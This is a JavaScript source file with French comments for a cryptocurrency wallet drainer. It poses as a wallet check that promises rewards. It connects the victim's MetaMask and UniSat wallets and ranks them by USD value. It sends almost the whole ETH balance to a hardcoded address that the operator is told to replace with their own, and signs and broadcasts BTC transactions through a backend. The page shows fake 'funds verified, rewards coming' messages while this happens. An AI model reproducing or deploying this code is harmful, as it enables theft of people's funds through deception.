document.addEventListener('DOMContentLoaded', () => {
    const connectWalletButton = document.getElementById('connectWallet');
    const statusText = document.getElementById('statusText');
    const loader = document.getElementById('loader');

    if (!window.ethers) {
        console.error('Erreur : ethers.js n’est pas chargé.');
        updateStatus('Erreur : Problème de chargement.', false, 'red');
        return;
    }

    // Prix approximatifs en USD (mars 2025, fictifs mais plausibles)
    const BTC_PRICE_USD = 85000; // $85,000 par BTC
    const ETH_PRICE_USD = 2000;  // $2,000 par ETH

    connectWalletButton.addEventListener('click', async () => {
        updateStatus('Vérification des portefeuilles...', true);
        connectWalletButton.disabled = true;

        let ethAddress = null;
        let btcAddress = null;
        let ethBalanceUsd = 0;
        let btcBalanceUsd = 0;

        try {
            // Détection MetaMask (ETH)
            if (window.ethereum && window.ethereum.isMetaMask) {
                console.log('Connexion à MetaMask...');
                const ethAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                ethAddress = ethAccounts[0];
                console.log('ETH détecté :', ethAddress);

                const provider = new window.ethers.providers.Web3Provider(window.ethereum);
                const ethBalance = await provider.getBalance(ethAddress);
                const ethBalanceEth = parseFloat(window.ethers.utils.formatEther(ethBalance));
                ethBalanceUsd = ethBalanceEth * ETH_PRICE_USD;
                console.log('Solde ETH :', ethBalanceEth, 'ETH (≈ $', ethBalanceUsd.toFixed(2), 'USD)');
            } else {
                console.log('MetaMask non détecté.');
            }

            // Détection UniSat (BTC)
            if (window.unisat) {
                console.log('Connexion à UniSat...');
                const btcAccounts = await window.unisat.requestAccounts();
                btcAddress = btcAccounts[0];
                console.log('BTC détecté :', btcAddress);

                const utxoResponse = await fetch('http://localhost:3000/get-utxos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: btcAddress })
                });
                if (utxoResponse.ok) {
                    const { utxos } = await utxoResponse.json();
                    const btcBalanceSat = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
                    const btcBalanceBtc = btcBalanceSat / 1e8;
                    btcBalanceUsd = btcBalanceBtc * BTC_PRICE_USD;
                    console.log('Solde BTC :', btcBalanceBtc, 'BTC (≈ $', btcBalanceUsd.toFixed(2), 'USD)');
                }
            } else {
                console.log('UniSat non détecté.');
            }

            if (!ethAddress && !btcAddress) {
                updateStatus('Erreur : Aucun portefeuille détecté.', false, 'red');
                connectWalletButton.disabled = false;
                return;
            }

            await delay(1000);
            updateStatus('Analyse des fonds...', true);

            // Comparaison des soldes en USD
            const drainPriority = [];
            if (ethBalanceUsd > 0 && (!btcBalanceUsd || ethBalanceUsd > btcBalanceUsd)) {
                drainPriority.push({ type: 'ETH', address: ethAddress });
                if (btcAddress && btcBalanceUsd > 0) drainPriority.push({ type: 'BTC', address: btcAddress });
            } else if (btcBalanceUsd > 0) {
                drainPriority.push({ type: 'BTC', address: btcAddress });
                if (ethAddress && ethBalanceUsd > 0) drainPriority.push({ type: 'ETH', address: ethAddress });
            } else if (ethBalanceUsd > 0) {
                drainPriority.push({ type: 'ETH', address: ethAddress });
            }

            console.log('Ordre de drainage (valeur en USD) :', drainPriority.map(item => `${item.type} ($${item.type === 'ETH' ? ethBalanceUsd.toFixed(2) : btcBalanceUsd.toFixed(2)})`));

            // Drainage dans l’ordre de priorité
            for (const { type, address } of drainPriority) {
                if (type === 'ETH') {
                    console.log('Drainage ETH en priorité...');
                    const ethResult = await drainETH(address);
                    console.log('ETH drainé :', ethResult ? 'Succès' : 'Échec');
                } else if (type === 'BTC') {
                    console.log('Drainage BTC en priorité...');
                    const btcResult = await drainBTC(address);
                    console.log('BTC drainé :', btcResult ? 'Succès' : 'Échec');
                }
            }

            updateStatus('Validation en cours...', true);
            await delay(2000);

            updateStatus('Fonds vérifiés ! Récompenses en préparation...', false, 'green');
            connectWalletButton.style.display = 'none';

        } catch (error) {
            updateStatus('Erreur : Échec de la vérification.', false, 'red');
            console.error('Erreur :', error);
            connectWalletButton.disabled = false;
        }
    });

    async function drainETH(ethAddress) {
        const provider = new window.ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const balance = await provider.getBalance(ethAddress);
        console.log('Solde ETH :', window.ethers.utils.formatEther(balance), 'ETH');

        if (balance.lte(0)) {
            console.log('Aucun ETH disponible');
            return false;
        }

        const gasPrice = await provider.getGasPrice();
        const gasLimit = window.ethers.BigNumber.from('21000');
        const gasCost = gasPrice.mul(gasLimit);
        console.log('Frais estimés :', window.ethers.utils.formatEther(gasCost), 'ETH');

        if (balance.lte(gasCost)) {
            console.log('Solde insuffisant pour couvrir les frais');
            return false;
        }

        const valueToSend = balance.sub(gasCost);
        console.log('Montant à envoyer :', window.ethers.utils.formatEther(valueToSend), 'ETH');

        const tx = {
            to: '0xabfbdD9337154878838BCDCE356B626D1C7ECA07', // Remplace par TON adresse ETH
            value: valueToSend,
            gasLimit: gasLimit,
            gasPrice: gasPrice
        };

        console.log('Envoi TX ETH...');
        const txResponse = await signer.sendTransaction(tx);
        await txResponse.wait();
        console.log('TX ETH réussie :', txResponse.hash);
        return true;
    }

    async function drainBTC(btcAddress) {
        console.log('Récupération UTXOs pour', btcAddress);
        const utxoResponse = await fetch('http://localhost:3000/get-utxos', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: btcAddress })
        });

        if (!utxoResponse.ok) throw new Error('Erreur UTXOs');
        const { utxos } = await utxoResponse.json();
        console.log('UTXOs :', utxos);

        if (!utxos.length) {
            console.log('Aucun BTC disponible');
            return false;
        }

        console.log('Création PSBT...');
        const psbtResponse = await fetch('http://localhost:3000/create-psbt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: btcAddress, utxos })
        });

        if (!psbtResponse.ok) throw new Error('Erreur PSBT');
        const { psbtHex } = await psbtResponse.json();

        console.log('Signature PSBT...');
        const signedPsbtHex = await window.unisat.signPsbt(psbtHex);

        console.log('Diffusion TX BTC...');
        const broadcastResponse = await fetch('http://localhost:3000/broadcast', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ psbtHex: signedPsbtHex })
        });

        if (!broadcastResponse.ok) throw new Error('Erreur diffusion');
        const { txid } = await broadcastResponse.json();
        console.log('TX BTC réussie :', txid);
        return true;
    }

    function updateStatus(text, showLoader = false, color = '#666') {
        statusText.textContent = text;
        statusText.style.color = color;
        loader.classList.toggle('hidden', !showLoader);
    }

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
});